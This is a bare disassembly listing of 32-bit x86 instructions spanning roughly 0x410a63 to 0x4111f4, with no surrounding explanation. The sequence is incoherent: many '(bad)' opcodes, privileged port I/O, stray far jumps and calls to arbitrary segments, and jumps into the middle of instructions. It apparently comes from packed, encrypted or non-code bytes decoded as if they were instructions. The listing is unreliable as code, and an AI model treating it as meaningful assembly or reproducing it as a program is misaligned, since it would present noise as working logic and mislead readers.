  410a63:	pusha  
  410a64:	dec    esp
  410a65:	add    al,0x3
  410a67:	idiv   eax
  410a69:	jb     0x410a42
  410a6b:	push   es
  410a6c:	pop    es
  410a6d:	sub    esi,DWORD PTR [ecx-0x8]
  410a70:	dec    edx
  410a71:	sbb    eax,edi
  410a73:	mov    edi,0xa7de7152
  410a78:	retf   0xcc0e
  410a7b:	push   cs
  410a7c:	inc    ebp
  410a7d:	mov    al,0x7d
  410a7f:	lds    ebp,FWORD PTR [edi-0x11]
  410a82:	out    0xf1,eax
  410a84:	js     0x410a8e
  410a86:	cdq    
  410a87:	test   al,0x6e
  410a89:	dec    DWORD PTR [eax-0x31c6ec41]
  410a8f:	lahf   
  410a90:	sbb    eax,0x9bf355fa
  410a95:	fcomp  DWORD PTR [ecx+0x53c31483]
  410a9b:	in     al,0x1b
  410a9d:	add    edx,edx
  410a9f:	into   
  410aa0:	(bad)  [ebx]
  410aa2:	mov    BYTE PTR [edi+ebx*1],cl
  410aa5:	mov    bh,0x4e
  410aa7:	clc    
  410aa8:	jno    0x410a50
  410aaa:	or     al,0x8f
  410aac:	xor    al,0x93
  410aae:	jb     0x410a85
  410ab0:	ja     0x410b26
  410ab2:	adc    al,0xfd
  410ab4:	jp     0x410a6a
  410ab6:	cli    
  410ab7:	xor    ah,bl
  410ab9:	cmp    al,0xec
  410abb:	iret   
  410abc:	xchg   edx,eax
  410abd:	int    0x66
  410abf:	dec    ebx
  410ac0:	and    ebp,DWORD PTR [edi]
  410ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ac3:	fdiv   st(3),st
  410ac5:	bound  ebp,QWORD PTR [esi+0x36]
  410ac8:	std    
  410ac9:	ror    BYTE PTR [ebx-0x5951f66],0xb6
  410ad0:	lock pop ss
  410ad2:	push   ecx
  410ad3:	jne    0x410ab3
  410ad5:	push   di
  410ad7:	out    dx,al
  410ad8:	mov    ebp,DWORD PTR [eax+0x60091f42]
  410ade:	in     al,0x9b
  410ae0:	xchg   esi,eax
  410ae1:	cwde   
  410ae2:	sbb    ebp,DWORD PTR [ecx]
  410ae4:	imul   ebp,ebp,0x4f
  410ae7:	mov    ecx,ecx
  410ae9:	lods   eax,DWORD PTR ds:[esi]
  410aea:	or     eax,0x75ddd867
  410aef:	nop
  410af0:	sbb    eax,0x2c13e763
  410af5:	gs push ecx
  410af7:	ds (bad) 
  410af9:	jl     0x410b6b
  410afb:	outs   dx,BYTE PTR ds:[esi]
  410afc:	das    
  410afd:	mov    cl,0x2f
  410aff:	mov    bh,0xa6
  410b01:	lods   al,BYTE PTR ds:[esi]
  410b02:	shr    DWORD PTR [edi-0x2d],0x82
  410b06:	push   ecx
  410b07:	adc    DWORD PTR [esi],0x8
  410b0a:	mov    dl,0x89
  410b0c:	mov    BYTE PTR [esi],cl
  410b0e:	adc    bh,BYTE PTR [eax+0x28]
  410b11:	popf   
  410b12:	jae    0x410ae0
  410b14:	pop    esp
  410b15:	xchg   ebx,eax
  410b16:	stc    
  410b17:	dec    edi
  410b18:	test   DWORD PTR [ebx],edi
  410b1a:	int    0x70
  410b1c:	xchg   edx,eax
  410b1d:	or     cl,bl
  410b1f:	adc    al,0x8e
  410b21:	fidiv  DWORD PTR [edi+0x80f325c]
  410b27:	or     DWORD PTR [esi+0x57bc7599],ebp
  410b2d:	mov    bh,0x16
  410b2f:	retf   
  410b30:	hlt    
  410b31:	jo     0x410b85
  410b33:	int    0xd
  410b35:	jo     0x410b68
  410b37:	sets   BYTE PTR [edi+0x4a]
  410b3b:	or     ch,BYTE PTR [ebx-0x7f6e9302]
  410b41:	dec    esi
  410b42:	sbb    BYTE PTR [eax],cl
  410b44:	mov    ah,0x43
  410b46:	cmp    ch,BYTE PTR [ebx+0xb205b2d]
  410b4c:	iret   
  410b4d:	lds    edi,FWORD PTR [esp+ecx*8-0x24b8065c]
  410b54:	rol    BYTE PTR [eax-0x6914ca89],0x2b
  410b5b:	(bad)  
  410b5c:	rol    DWORD PTR ds:[edx-0x5ae66dfa],cl
  410b63:	push   edi
  410b64:	loope  0x410b41
  410b66:	and    ch,0x52
  410b69:	jg     0x410bd4
  410b6b:	lea    edx,[ecx+eax*1-0x54ee2f14]
  410b72:	mov    al,0xc5
  410b74:	ror    BYTE PTR es:[ebx+0x54f18097],0x1e
  410b7c:	or     eax,0xc62be7bd
  410b81:	fxch   st(6)
  410b83:	in     al,dx
  410b84:	pop    es
  410b85:	dec    ebp
  410b86:	jecxz  0x410b59
  410b88:	pushf  
  410b89:	fldcw  WORD PTR [esi-0x42]
  410b8c:	cmp    eax,0x3e5a5a58
  410b91:	dec    ebp
  410b92:	mov    al,0xef
  410b94:	fmul   DWORD PTR [edi]
  410b96:	adc    DWORD PTR ds:0x5831521a,edi
  410b9c:	jmp    0x6e873088
  410ba1:	je     0x410b7b
  410ba3:	add    eax,0x9b8e8833
  410ba8:	in     eax,dx
  410ba9:	ins    DWORD PTR es:[edi],dx
  410baa:	jbe    0x410bb8
  410bac:	cmp    al,0xa5
  410bae:	ins    BYTE PTR es:[edi],dx
  410baf:	sbb    dh,BYTE PTR [eax-0x39]
  410bb2:	es in  al,dx
  410bb4:	mov    ds:0x5afd4fd5,eax
  410bb9:	dec    edi
  410bba:	and    BYTE PTR [edx-0x65],bl
  410bbd:	rcl    BYTE PTR [ebp-0x4c63c75c],1
  410bc3:	pop    ss
  410bc4:	add    esp,ecx
  410bc6:	inc    edx
  410bc7:	ret    
  410bc8:	add    bl,BYTE PTR [edx]
  410bca:	add    al,0x42
  410bcc:	cmc    
  410bcd:	ds jecxz 0x410bf7
  410bd0:	push   esp
  410bd1:	clc    
  410bd2:	(bad)  
  410bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bd4:	mov    DWORD PTR [esi+eax*4+0x452a98a6],0x7c9b69ff
  410bdf:	enter  0x48a3,0xb5
  410be3:	xor    ecx,DWORD PTR [esi+0x2f02c7ad]
  410be9:	adc    al,0xfb
  410beb:	jle    0x410b9e
  410bed:	mov    DWORD PTR [esi],ebx
  410bef:	mov    ebp,0x24121921
  410bf4:	push   ds
  410bf5:	pop    ds
  410bf6:	(bad)  
  410bf7:	shr    DWORD PTR ds:0xc7127c28,cl
  410bfd:	cli    
  410bfe:	fstp   TBYTE PTR [esp+esi*1+0x15]
  410c02:	cmp    al,0xe
  410c04:	inc    esp
  410c05:	sub    DWORD PTR [edi-0x2d],esp
  410c08:	mov    ds:0x155952c7,eax
  410c0d:	pop    ebp
  410c0e:	retf   0x652
  410c11:	mov    edx,0x80ac7df
  410c16:	js     0x410bbc
  410c18:	gs inc esp
  410c1a:	int3   
  410c1b:	push   cs
  410c1c:	dec    BYTE PTR [edi+0x309f5980]
  410c22:	sub    DWORD PTR ss:[ecx+0x69],esi
  410c26:	inc    edx
  410c27:	fist   DWORD PTR [edx+0x4f12ecc5]
  410c2d:	rcl    DWORD PTR [esi+0x27],1
  410c30:	dec    edx
  410c31:	out    0x19,eax
  410c33:	adc    eax,0x993c51a
  410c38:	(bad)  
  410c3a:	jne    0x410c77
  410c3c:	daa    
  410c3d:	retf   0x41a8
  410c40:	div    esi
  410c42:	or     al,0xe8
  410c44:	lock and BYTE PTR [eax+eax*8],ch
  410c48:	mov    al,0x15
  410c4a:	adc    BYTE PTR [ebx-0x76],ah
  410c4d:	push   cs
  410c4e:	xchg   edi,eax
  410c4f:	stc    
  410c50:	cdq    
  410c51:	mov    ?,WORD PTR [ecx+0x52]
  410c54:	pop    ecx
  410c55:	into   
  410c56:	aas    
  410c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c58:	lea    edi,[edx+0x73550fbc]
  410c5e:	cmp    al,0xaf
  410c60:	fdiv   st,st(7)
  410c62:	push   0x5d
  410c64:	icebp  
  410c65:	and    eax,0x688f773a
  410c6a:	(bad)  
  410c6b:	je     0x410ca2
  410c6d:	add    DWORD PTR [ebx+0x2468a9df],eax
  410c73:	inc    edi
  410c74:	rcl    DWORD PTR [esi+0x4a81df2],1
  410c7a:	mov    edi,0xf8a18aac
  410c7f:	mov    esp,ebx
  410c81:	push   edx
  410c82:	jo     0x410ca6
  410c84:	lahf   
  410c85:	outs   dx,DWORD PTR ds:[esi]
  410c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c87:	xchg   ebx,eax
  410c88:	sahf   
  410c89:	sub    DWORD PTR [ecx-0x518f1e2],0xffffffd7
  410c90:	or     al,0xcb
  410c92:	ds dec ebp
  410c94:	push   0xffffffdd
  410c96:	add    BYTE PTR [edx+0x7136484d],al
  410c9c:	xor    edi,DWORD PTR [ecx+ecx*8+0x67]
  410ca0:	faddp  st(3),st
  410ca2:	aaa    
  410ca3:	jl     0x410d04
  410ca5:	stc    
  410ca6:	dec    edx
  410ca7:	aaa    
  410ca8:	or     esp,esp
  410caa:	sub    DWORD PTR [eax],0x55
  410cad:	dec    edx
  410cae:	ja     0x410c47
  410cb0:	shl    BYTE PTR ss:[ebx-0xc48933e],cl
  410cb7:	mov    ebp,DWORD PTR [ebp+eiz*4-0x3e]
  410cbb:	xor    al,0x21
  410cbd:	mov    esi,0x8251a5ff
  410cc2:	loopne 0x410cae
  410cc4:	pop    edx
  410cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cc6:	pusha  
  410cc7:	test   dl,ah
  410cc9:	mov    al,ds:0xbc72620b
  410cce:	jae    0x410cd2
  410cd0:	push   ds
  410cd1:	sbb    dl,al
  410cd3:	das    
  410cd4:	push   eax
  410cd5:	mov    DWORD PTR [edx-0x734ecc32],ebx
  410cdb:	mov    bh,0x2d
  410cdd:	popf   
  410cde:	mov    al,ch
  410ce0:	sbb    ah,BYTE PTR [edx-0x1e707634]
  410ce6:	mov    DWORD PTR [edx+eiz*1-0x57],ebp
  410cea:	xchg   esp,eax
  410ceb:	jl     0x410d31
  410ced:	mov    edi,ebx
  410cef:	and    DWORD PTR [edx],edx
  410cf1:	lahf   
  410cf2:	aam    0x1d
  410cf4:	adc    DWORD PTR [eax-0x451a867a],ebp
  410cfa:	cmp    dl,BYTE PTR [eax+0x2f]
  410cfd:	pop    es
  410cfe:	aas    
  410cff:	push   edi
  410d00:	jbe    0x410d26
  410d02:	(bad)  
  410d03:	fidivr WORD PTR [ebp-0x2c]
  410d06:	popf   
  410d07:	ret    0x22
  410d0a:	jecxz  0x410cd2
  410d0c:	aad    0x84
  410d0e:	cmp    bh,BYTE PTR [esi-0x7dc7ade4]
  410d14:	add    eax,0xc0505b50
  410d19:	xlat   BYTE PTR ds:[ebx]
  410d1a:	or     eax,0x76ede206
  410d1f:	jle    0x410cd8
  410d21:	fimul  DWORD PTR [ebx]
  410d23:	lea    esp,[edx+0x2b38aa49]
  410d29:	xor    DWORD PTR [ebp+0x1b],0xf3c8dadc
  410d30:	out    dx,eax
  410d31:	or     al,0xd7
  410d33:	push   esi
  410d34:	or     edi,DWORD PTR [esi-0x1c]
  410d37:	mov    bl,0xad
  410d39:	stos   BYTE PTR es:[edi],al
  410d3a:	cmp    eax,0x351eaeec
  410d3f:	cdq    
  410d40:	popa   
  410d41:	xor    bh,BYTE PTR [ebp+ecx*1-0x75]
  410d45:	out    dx,al
  410d46:	(bad)  
  410d48:	inc    ebx
  410d49:	or     dh,BYTE PTR [ebx]
  410d4b:	inc    edx
  410d4c:	jb     0x410db1
  410d4e:	mov    dl,BYTE PTR ds:0xf049d003
  410d54:	pop    ecx
  410d55:	push   ebp
  410d56:	scas   al,BYTE PTR es:[edi]
  410d57:	mov    esi,0xf7ef522e
  410d5c:	mov    ch,0xb7
  410d5e:	out    0xce,al
  410d60:	icebp  
  410d61:	dec    esi
  410d62:	sub    DWORD PTR ds:0xc784d224,ebp
  410d68:	pusha  
  410d69:	lea    eax,[edi]
  410d6b:	dec    esi
  410d6c:	sub    DWORD PTR [ebx],esi
  410d6e:	adc    BYTE PTR [esi+0x1],0x8b
  410d72:	xchg   ax,ax
  410d74:	cld    
  410d75:	retf   0x11c7
  410d78:	cli    
  410d79:	mov    esp,0xb2692e0e
  410d7e:	push   ebp
  410d7f:	inc    edi
  410d80:	add    eax,0x8998ed8f
  410d85:	jmp    0x410d5f
  410d87:	push   ss
  410d88:	xchg   ecx,eax
  410d89:	rcl    DWORD PTR [edi+edx*8+0x6b20df1e],cl
  410d90:	ins    DWORD PTR es:[edi],dx
  410d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d92:	(bad)
  410d96:	(bad)  
  410d98:	mov    esp,DWORD PTR [ebx-0x6f]
  410d9b:	jae    0x410d2f
  410d9d:	(bad)  
  410d9e:	fst    DWORD PTR [ebx-0x7dfd4a78]
  410da4:	aad    0x84
  410da6:	cmp    BYTE PTR [ebx-0x46],ah
  410da9:	lds    ecx,FWORD PTR [esi+0x51]
  410dac:	sbb    BYTE PTR [eax+0x5f],dh
  410daf:	mov    al,0xb9
  410db1:	les    edi,FWORD PTR [edi+0x3f0cfc3b]
  410db7:	stos   DWORD PTR es:[edi],eax
  410db8:	push   0x74
  410dba:	xchg   DWORD PTR [ecx+0x6e],ebp
  410dbd:	jmp    0xe4d:0xa2f1fcd6
  410dc4:	adc    BYTE PTR [ebx],bh
  410dc6:	stos   BYTE PTR es:[edi],al
  410dc7:	sbb    bl,0x9b
  410dca:	push   es
  410dcb:	and    dl,BYTE PTR [ebp+0x77d430fe]
  410dd1:	ins    DWORD PTR es:[edi],dx
  410dd2:	jae    0x1219c055
  410dd8:	mov    bl,ch
  410dda:	cli    
  410ddb:	out    0xad,eax
  410ddd:	dec    ebx
  410dde:	gs das 
  410de0:	jnp    0x410e01
  410de2:	mov    eax,ds:0x1b270434
  410de7:	retf   
  410de8:	and    bh,BYTE PTR [esi+eax*2+0x49]
  410dec:	dec    esi
  410ded:	mov    ebx,0xa11707af
  410df2:	push   edx
  410df3:	mov    ebp,0xe0ecf44d
  410df8:	dec    ecx
  410df9:	cld    
  410dfa:	and    al,0x0
  410dfc:	test   eax,0x418f255e
  410e01:	js     0x410e1a
  410e03:	icebp  
  410e04:	pop    ebx
  410e05:	or     BYTE PTR [eax],dl
  410e07:	dec    ebx
  410e08:	lock xor BYTE PTR [edx+0x23cf1343],bh
  410e0f:	and    BYTE PTR ds:0xa5df6f24,dl
  410e15:	push   cs
  410e16:	and    ch,BYTE PTR ss:[edx]
  410e19:	inc    ebx
  410e1a:	sbb    DWORD PTR es:[ecx+0x6e3bbbea],eax
  410e21:	mov    ebp,0xd2a45c8f
  410e26:	in     eax,0x5a
  410e28:	mov    esi,0x36584af5
  410e2d:	dec    ecx
  410e2e:	xlat   BYTE PTR ds:[ebx]
  410e2f:	xor    al,0xe0
  410e31:	jo     0x410e0f
  410e33:	mov    esp,0x28ed2f7a
  410e38:	and    BYTE PTR [eax+0x24e9b08e],bh
  410e3e:	mov    bl,0xc4
  410e40:	pop    esi
  410e41:	sti    
  410e42:	cmp    al,0xd8
  410e44:	inc    ebx
  410e45:	jnp    0x410e88
  410e47:	into   
  410e48:	jl     0x410ea9
  410e4a:	push   cs
  410e4b:	sbb    DWORD PTR [ebx],ecx
  410e4d:	outs   dx,DWORD PTR ds:[esi]
  410e4e:	jl     0x410eab
  410e50:	loope  0x410ecf
  410e52:	push   ecx
  410e53:	cmc    
  410e54:	xor    eax,0xb33d24ce
  410e59:	not    ch
  410e5b:	and    DWORD PTR [esp+esi*1],ecx
  410e5e:	dec    eax
  410e5f:	sbb    al,0x1e
  410e61:	inc    esi
  410e62:	pop    es
  410e63:	pop    ds
  410e64:	push   ss
  410e65:	scas   al,BYTE PTR es:[edi]
  410e66:	pop    esi
  410e67:	xchg   ebx,eax
  410e68:	pop    ecx
  410e69:	test   BYTE PTR [ecx+0x79],bl
  410e6c:	or     al,0x6c
  410e6e:	loope  0x410e87
  410e70:	iret   
  410e71:	les    ebx,FWORD PTR [edx]
  410e73:	(bad)  
  410e74:	outs   dx,DWORD PTR ds:[esi]
  410e75:	int3   
  410e76:	pop    edx
  410e77:	jbe    0x410e07
  410e79:	jae    0x410dfb
  410e7b:	sti    
  410e7c:	pop    ebp
  410e7d:	add    BYTE PTR cs:[ebp-0x6e],ah
  410e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e82:	push   ebx
  410e83:	leave  
  410e84:	imul   eax,DWORD PTR [edi],0x79377faf
  410e8a:	adc    DWORD PTR [edi+0x1d],esp
  410e8d:	jbe    0x410ea8
  410e8f:	scas   eax,DWORD PTR es:[edi]
  410e90:	sbb    ch,BYTE PTR [edx-0x63]
  410e93:	lahf   
  410e94:	push   esp
  410e95:	test   al,0x9
  410e97:	mov    al,0x77
  410e99:	sahf   
  410e9a:	adc    esi,DWORD PTR ds:0x635930b8
  410ea0:	sbb    al,0xbd
  410ea2:	dec    ecx
  410ea3:	call   0x3f67:0x33beab44
  410eaa:	pop    es
  410eab:	call   0xe708b4d4
  410eb0:	fcom   DWORD PTR [edx+eax*2]
  410eb3:	cwde   
  410eb4:	jno    0x410ebf
  410eb6:	cmc    
  410eb7:	in     al,0x15
  410eb9:	sahf   
  410eba:	mov    edi,0x99d9d4b9
  410ebf:	test   BYTE PTR [ebp-0x4cffa500],dl
  410ec5:	call   0x9888:0xfb9d3237
  410ecc:	push   edx
  410ecd:	mov    WORD PTR [edi],gs
  410ecf:	psubq  mm7,QWORD PTR [ebx+ebx*4-0xc]
  410ed4:	repz retf 
  410ed6:	push   esi
  410ed7:	bound  ebp,QWORD PTR [eax-0x20eedb61]
  410edd:	jns    0x410edb
  410edf:	iret   
  410ee0:	push   es
  410ee1:	jecxz  0x410ef4
  410ee3:	retf   
  410ee4:	cmp    dh,dl
  410ee6:	dec    ebx
  410ee7:	pop    edx
  410ee8:	(bad)  
  410ee9:	push   eax
  410eea:	clc    
  410eeb:	outs   dx,BYTE PTR ds:[esi]
  410eec:	pop    edi
  410eed:	inc    esi
  410eee:	lods   al,BYTE PTR ds:[esi]
  410eef:	dec    ebx
  410ef0:	sahf   
  410ef1:	bound  ebp,QWORD PTR [ebp-0x6f05fe3b]
  410ef7:	cmp    ebx,DWORD PTR ds:0x61e48391
  410efd:	bound  eax,QWORD PTR [ebx+0x756587d4]
  410f03:	ret    0x2b17
  410f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f07:	jmp    0x9329:0xf62c7a2b
  410f0e:	scas   eax,DWORD PTR es:[edi]
  410f0f:	imul   ebx,ebp,0x15
  410f12:	inc    edx
  410f13:	das    
  410f14:	push   eax
  410f15:	xor    DWORD PTR [edx],esp
  410f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f18:	xchg   ebp,eax
  410f19:	jb     0x410f1d
  410f1b:	push   esp
  410f1c:	test   BYTE PTR [edx],dl
  410f1e:	sub    dl,BYTE PTR [edx]
  410f20:	repnz dec esp
  410f22:	int3   
  410f23:	rcl    DWORD PTR [eax+0x93a29b4],cl
  410f29:	shl    DWORD PTR [eax],cl
  410f2b:	mov    al,BYTE PTR [edi+0x4b4afa51]
  410f31:	into   
  410f32:	outs   dx,DWORD PTR ds:[esi]
  410f33:	mul    DWORD PTR [esi-0x775683d3]
  410f39:	cmp    edi,DWORD PTR [ebx+eax*4]
  410f3c:	aas    
  410f3d:	jg     0x410ee0
  410f3f:	xchg   BYTE PTR [ecx+edx*8-0x643de3e4],bl
  410f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f47:	jo     0x410fbb
  410f49:	and    al,0x44
  410f4b:	push   ss
  410f4c:	xchg   ecx,eax
  410f4d:	and    al,0xd2
  410f4f:	rcl    BYTE PTR [edx-0x45],cl
  410f52:	cmp    DWORD PTR [ecx+0x68524fb7],esi
  410f58:	addr16 push 0x6a7b4b31
  410f5e:	cdq    
  410f5f:	jl     0x410fd3
  410f61:	sub    al,0x96
  410f63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f64:	cmp    DWORD PTR [esi+0xef08dd2],0xe3bca61f
  410f6e:	stos   DWORD PTR es:[edi],eax
  410f6f:	or     edi,DWORD PTR [eax-0x2c7cdde6]
  410f75:	jmp    0x8a061a39
  410f7a:	aam    0x20
  410f7c:	sbb    al,0x4
  410f7e:	in     al,dx
  410f7f:	dec    edi
  410f80:	cmc    
  410f81:	fild   WORD PTR [eax+0x2f]
  410f84:	dec    esi
  410f85:	fs pushf 
  410f87:	pushf  
  410f88:	dec    esp
  410f89:	jge    0x410fee
  410f8b:	mov    ds:0xd5e160e6,al
  410f90:	cld    
  410f91:	pop    ecx
  410f92:	cmc    
  410f93:	pop    ss
  410f94:	xor    eax,0x7447b8c3
  410f99:	scas   al,BYTE PTR es:[edi]
  410f9a:	scas   al,BYTE PTR es:[edi]
  410f9b:	mov    ecx,0x5c1fab9b
  410fa0:	mov    bh,0x93
  410fa2:	jmp    0xa84263d4
  410fa7:	add    al,0xc7
  410fa9:	scas   eax,DWORD PTR es:[edi]
  410faa:	in     eax,dx
  410fab:	pop    edx
  410fac:	imul   ebx,DWORD PTR [edx],0xc16bdea6
  410fb2:	popf   
  410fb3:	push   es
  410fb4:	cmp    BYTE PTR [edx+0x2b],0x1e
  410fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fb9:	jne    0x410fd0
  410fbb:	daa    
  410fbc:	pop    ebx
  410fbd:	data16 add al,0xee
  410fc0:	or     edi,DWORD PTR ds:0x1c08a7b8
  410fc6:	mov    edx,0x59f38fdf
  410fcb:	jo     0x410f70
  410fcd:	push   ds
  410fce:	xor    bh,BYTE PTR [esi+0x35f7ac0c]
  410fd4:	pusha  
  410fd5:	ficom  DWORD PTR [ebx]
  410fd7:	je     0x411027
  410fd9:	push   0xceb160ec
  410fde:	(bad)  
  410fe0:	iret   
  410fe1:	loop   0x410ff7
  410fe3:	ins    DWORD PTR es:[edi],dx
  410fe4:	jbe    0x411051
  410fe6:	fld    DWORD PTR [esi]
  410fe8:	xor    edx,DWORD PTR [esi]
  410fea:	xchg   esi,eax
  410feb:	push   edi
  410fec:	adc    BYTE PTR [ebx+edx*8-0x7c3f927c],dh
  410ff3:	inc    eax
  410ff4:	push   ecx
  410ff5:	ds inc eax
  410ff7:	iret   
  410ff8:	fistp  DWORD PTR [edi]
  410ffa:	sbb    eax,0xe527b3fc
  410fff:	and    al,BYTE PTR [edi]
  411001:	shr    DWORD PTR [edx-0x5e],cl
  411004:	or     ebp,edi
  411006:	push   ss
  411007:	push   ebp
  411008:	(bad)  
  411009:	std    
  41100a:	pop    ebx
  41100b:	inc    ebx
  41100c:	jno    0x411089
  41100e:	inc    edi
  41100f:	or     ah,dl
  411011:	and    ah,BYTE PTR [ebp+0x75ecccd8]
  411017:	jo     0x41107b
  411019:	mov    ecx,0xbe91d587
  41101e:	pop    esp
  41101f:	and    al,BYTE PTR [eax-0x79e3241e]
  411025:	mov    ds:0xa089bf69,eax
  41102a:	pop    ebp
  41102b:	mov    eax,0x2c001188
  411030:	jmp    0x622917f7
  411035:	cmp    bl,al
  411037:	mov    ebp,0x20d890ec
  41103c:	pop    edi
  41103d:	mov    ah,0x41
  41103f:	cmp    al,0xd
  411041:	inc    edx
  411042:	dec    ebp
  411043:	iret   
  411044:	(bad)  
  411046:	sub    eax,0xc4eceabe
  41104b:	mov    edi,0xd33e9c7e
  411050:	scas   eax,DWORD PTR es:[edi]
  411051:	inc    edi
  411052:	stos   BYTE PTR es:[edi],al
  411053:	dec    ebp
  411054:	pop    edi
  411055:	idiv   bh
  411057:	mov    edi,0x8538e37b
  41105c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41105d:	add    eax,edx
  41105f:	ja     0x411066
  411061:	and    esi,ecx
  411063:	jne    0x4110df
  411065:	push   ds
  411066:	std    
  411067:	cmp    eax,0x61b0226f
  41106c:	sahf   
  41106d:	scas   eax,DWORD PTR es:[edi]
  41106e:	enter  0x480,0x32
  411072:	loop   0x41102e
  411074:	(bad)  
  411075:	and    eax,0x3c811e93
  41107a:	adc    al,0x16
  41107c:	popa   
  41107d:	mov    ah,0x53
  41107f:	scas   al,BYTE PTR es:[edi]
  411080:	(bad)  
  411081:	dec    BYTE PTR [ebp-0x37]
  411084:	jnp    0x411052
  411086:	fidivr DWORD PTR [edi+ebx*2]
  411089:	mov    eax,ds:0x4ccbccc9
  41108e:	ss push ebp
  411090:	dec    edi
  411091:	icebp  
  411092:	ret    0xed4d
  411095:	(bad)  
  411096:	hlt    
  411097:	and    esi,DWORD PTR [ebx-0x19bc5ec4]
  41109d:	(bad)  
  41109e:	lods   al,BYTE PTR ds:[esi]
  41109f:	cmp    dl,BYTE PTR [ecx+0x50548a30]
  4110a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110a6:	pop    esi
  4110a7:	mov    bh,0xeb
  4110a9:	jne    0x411044
  4110ab:	xor    ebp,DWORD PTR gs:[ebx]
  4110ae:	jb     0x4110a8
  4110b0:	inc    ebx
  4110b1:	jmp    0xf46a:0xb934e78d
  4110b8:	jnp    0x411049
  4110ba:	mov    dh,0xde
  4110bc:	ja     0x411080
  4110be:	add    eax,DWORD PTR [edi]
  4110c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c1:	push   0x3cd7ea58
  4110c6:	pop    ebx
  4110c7:	sbb    ebx,edi
  4110c9:	daa    
  4110ca:	dec    esi
  4110cb:	fiadd  WORD PTR [ebx+0x4]
  4110ce:	push   ecx
  4110cf:	test   BYTE PTR [eax-0x29adea43],al
  4110d5:	repz and DWORD PTR [edi-0x23e0a56d],ebx
  4110dc:	mov    WORD PTR [edi],cs
  4110de:	jne    0x411137
  4110e0:	add    eax,0x747b25c1
  4110e5:	push   eax
  4110e6:	les    edx,FWORD PTR [eax-0x57f62786]
  4110ec:	sub    ebp,DWORD PTR [ebx+0x12281115]
  4110f2:	jns    0x41113e
  4110f4:	les    edx,FWORD PTR [ebp-0x4a]
  4110f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110f8:	dec    esp
  4110f9:	dec    ebp
  4110fa:	addr16 aam 0x1b
  4110fd:	icebp  
  4110fe:	mov    eax,ds:0xd487449a
  411103:	cdq    
  411104:	jne    0x411145
  411106:	out    0x78,al
  411108:	out    dx,al
  411109:	fsubr  st,st(0)
  41110b:	shl    BYTE PTR ds:[ebx-0x6],0xcc
  411110:	adc    al,0xc4
  411112:	adc    DWORD PTR [ecx+0x595b579a],eax
  411118:	jne    0x4110ac
  41111a:	sub    edx,edi
  41111c:	dec    esp
  41111d:	mov    bh,cl
  41111f:	popa   
  411120:	mov    esp,DWORD PTR [edx]
  411122:	add    cl,BYTE PTR [edx-0x17]
  411125:	or     dh,BYTE PTR [edx-0x32427a53]
  41112b:	mov    edx,0x3e8bf8b8
  411130:	mov    cl,0x5a
  411132:	lods   al,BYTE PTR ds:[si]
  411134:	and    edx,esp
  411136:	and    al,0x6b
  411138:	in     eax,0x25
  41113a:	je     0x4110d5
  41113c:	into   
  41113d:	ret    
  41113e:	int    0xa7
  411140:	mov    ebp,0xb4e59211
  411145:	sbb    esi,eax
  411147:	jns    0x4110d8
  411149:	mov    al,0xe0
  41114b:	cmp    DWORD PTR [edx-0x1d],esp
  41114e:	push   eax
  41114f:	jl     0x411129
  411151:	(bad)  
  411152:	out    dx,al
  411153:	sub    eax,0xbfdcdacf
  411158:	inc    ebp
  411159:	jmp    0xd4b8:0xe3ba99b0
  411160:	in     al,dx
  411161:	mov    DWORD PTR [edx+0x2e19fd67],ebx
  411167:	and    cl,ch
  411169:	adc    DWORD PTR [edi+ebx*1],edi
  41116c:	push   ebx
  41116d:	(bad)  
  41116e:	cdq    
  41116f:	fdivr  QWORD PTR [edi+0x24]
  411172:	xchg   edi,eax
  411173:	adc    BYTE PTR [esi-0x124b912],cl
  411179:	xchg   edi,eax
  41117a:	in     eax,dx
  41117b:	inc    edx
  41117c:	mov    edx,DWORD PTR [esi+ecx*4-0xa]
  411180:	cdq    
  411181:	jne    0x411163
  411183:	loope  0x4111bc
  411185:	fnstcw WORD PTR [edi+0x32]
  411188:	retf   0x6528
  41118b:	not    ebx
  41118d:	xor    al,0x9f
  41118f:	or     al,dh
  411191:	add    dh,BYTE PTR [esi]
  411193:	mov    ch,0xd7
  411195:	icebp  
  411196:	push   ebx
  411197:	popf   
  411198:	xor    al,0x16
  41119a:	dec    ebp
  41119b:	mov    ds:0xd5859b14,eax
  4111a0:	cmp    DWORD PTR [edi],ecx
  4111a2:	cld    
  4111a3:	pop    esi
  4111a4:	dec    edi
  4111a5:	mov    ecx,0x4ec6b3f6
  4111aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111ab:	adc    ch,dh
  4111ad:	jb     0x411148
  4111af:	pop    eax
  4111b0:	jae    0x411219
  4111b2:	mov    cl,0x76
  4111b4:	data16 (bad) 
  4111b6:	bound  ebx,QWORD PTR [edx-0x2b72f3f]
  4111bc:	mov    edi,0x55b52402
  4111c1:	repz pop edi
  4111c3:	(bad)  
  4111c4:	aas    
  4111c5:	fisttp QWORD PTR [eax+esi*4]
  4111c8:	dec    eax
  4111c9:	xchg   ecx,eax
  4111ca:	pop    es
  4111cb:	xlat   BYTE PTR ds:[ebx]
  4111cc:	xchg   esp,eax
  4111cd:	(bad)  
  4111ce:	push   cs
  4111cf:	ds jae 0x4111eb
  4111d2:	test   DWORD PTR [edi+0x80ebec7],0xed5ce6cf
  4111dc:	(bad)  
  4111de:	loop   0x411251
  4111e0:	jp     0x411231
  4111e2:	fist   WORD PTR [esi-0x251cc128]
  4111e8:	imul   edi,esp,0x7cf2aed2
  4111ee:	sbb    al,BYTE PTR ds:0x27bcdc44
  4111f4:	mov    dh,bh
